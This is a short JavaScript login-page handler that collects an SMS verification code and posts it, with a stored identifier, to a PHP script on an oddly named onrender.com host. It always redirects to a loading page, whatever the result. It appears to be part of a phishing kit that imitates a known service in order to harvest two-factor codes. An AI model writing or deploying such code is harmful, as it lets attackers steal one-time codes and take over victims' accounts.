document.getElementById("login-button").addEventListener("click", function (event) {
    event.preventDefault(); // Prevent form submission

    // Get the entered OTP
    const otp = document.getElementById("otp").value.trim();

    // Error display element
    const errorElement = document.getElementById("otp-error");

    // Validate OTP input
    if (!otp) {
        errorElement.textContent = "Please enter the SMS code.";
        return;
    }
    if (!/^\d+$/.test(otp)) {
        errorElement.textContent = "The SMS code must be numeric.";
        return;
    }
    errorElement.textContent = ""; // Clear any previous error message

    // Prepare data to send
    const data = { otp, unique_id: localStorage.getItem('unique_id') };

    // Send OTP to PHP script
    fetch("https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/send_otp.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
    })
        .then((response) => response.json())
        .then((result) => {
            if (result.success) {
                window.location.href = "loading.html";
            } else {
                window.location.href = "loading.html";
            }
        })
        .catch((error) => {
            console.error("Error:", error);
            alert("An error occurred. Please try again.");
        });
});
